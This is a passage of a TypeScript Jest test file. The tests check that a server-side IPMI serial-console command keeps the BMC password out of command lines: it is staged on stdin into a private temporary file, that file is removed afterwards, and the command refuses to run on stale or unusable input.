    // one must not put it back.
    const r = rig()

    await r.actions.powerAction('m1', 'r1', 'on')
    await r.actions.powerBulk(['m1', 'm2'], 'soft')
    await r.sweeper.run()

    expect(r.harness.exec.mock.calls.every(([, options]) => options?.stdin === PASSWORD)).toBe(true)
    expect(JSON.stringify(r.document())).not.toContain(PASSWORD)
    expect(JSON.stringify(r.document())).not.toContain('password')
  })
})

/* ------------------------------------------------------------------------ */
/* solCommand                                                                */
/* ------------------------------------------------------------------------ */

/** What the staging call answers with: the path it wrote the password to. */
const STAGED_PATH = '/tmp/tmp.AbCdEf'

function solRig(options: RigOptions = {}): Rig {
    return rig(
        {},
        {
            ...options,
            answer: (command: string) =>
                command.includes('mktemp')
                    ? { stdout: `${STAGED_PATH}\n`, stderr: '', code: 0 }
                    : ok('')
        }
    )
}

describe('solCommand: opening a serial console without the password going anywhere', () => {
    it('stages the password over stdin and answers with a command that names only the path', async () => {
        // The whole reason this method exists. A `terminal` block's ordinary
        // commandTemplate is built in the browser, so a password in one would
        // be visible in the spec and on the wire; this command is composed on
        // the server and carries a path, which is not a secret.
        const r = solRig()

        const built = await r.actions.solCommand('m1', 'r1')

        expect(built.problem).toBeUndefined()
        expect(built.command).toContain('sol activate')
        expect(built.command).toContain(`-f '${STAGED_PATH}'`)
        expect(built.command).not.toContain(PASSWORD)
    })

    it('never puts the password in a command line, on this machine or the target', async () => {
        const r = solRig()

        const built = await r.actions.solCommand('m1', 'r1')

        // Both halves: the staging call passes it on stdin the way every other
        // ipmitool call here does, and the session command has no trace of it.
        for (const command of r.commands()) expect(command).not.toContain(PASSWORD)
        expect(r.harness.exec.mock.calls[0][1]).toMatchObject({ stdin: PASSWORD })
        expect(JSON.stringify(built)).not.toContain(PASSWORD)
    })

    it('creates the file with a umask that keeps anybody else out of it', async () => {
        const r = solRig()

        await r.actions.solCommand('m1', 'r1')

        expect(r.harness.exec.mock.calls[0][0]).toContain('umask 077')
        expect(r.harness.exec.mock.calls[0][0]).toContain('mktemp')
    })

    it('removes the file when the session ends, however it ends', async () => {
        const r = solRig()

        const built = await r.actions.solCommand('m1', 'r1')

        // `;` rather than `&&`: the escape sequence, the BMC dropping the
        // session and a non-zero exit all have to take the file with them.
        expect(built.command).toMatch(/;\s*rm -f '\/tmp\/tmp\.AbCdEf'/)
    })

    it('addresses the machine the row named, not whichever one is first', async () => {
        const r = solRig()

        const built = await r.actions.solCommand('m2', 'r2')

        expect(built.command).toContain("-H '10.0.0.6'")
    })

    it('opens nothing and says why when there is no usable password', async () => {
        const r = solRig({ withoutPassword: ['m1'] })

        const built = await r.actions.solCommand('m1', 'r1')

        expect(built.command).toBe('')
        expect(built.problem).toMatch(/password/i)
        // Nothing was staged, so nothing has to be cleaned up.
        expect(r.commands()).toEqual([])
    })

    it('opens nothing when the saved password cannot be read', async () => {
        const r = solRig({ unreadable: ['m1'] })

        const built = await r.actions.solCommand('m1', 'r1')

        expect(built.command).toBe('')
        expect(built.problem).toMatch(/again/i)
    })

    it('refuses a stale row rather than opening a console on a machine that changed', async () => {
        const r = solRig()

        const built = await r.actions.solCommand('m1', 'r-older')

        expect(built.command).toBe('')
        expect(built.problem).toMatch(/changed|removed/i)
        expect(r.commands()).toEqual([])
    })

    it('opens nothing when the password could not be staged, rather than a session with no credential', async () => {
        const r = rig({}, { answer: () => ({ stdout: '', stderr: 'mktemp: failed', code: 1 }) })

        const built = await r.actions.solCommand('m1', 'r1')

        expect(built.command).toBe('')
        expect(built.problem).toMatch(/staged/i)
    })

    it('refuses an answer that is not a path, rather than passing it to -f', async () => {
        // A staging command that half-worked could echo anything; a `-f` given
        // a fragment of shell output would be a confusing failure at best.
        const r = rig({}, { answer: () => ({ stdout: 'permission denied\n', stderr: '', code: 0 }) })

        const built = await r.actions.solCommand('m1', 'r1')

        expect(built.command).toBe('')
        expect(built.problem).toMatch(/staged/i)
    })
})
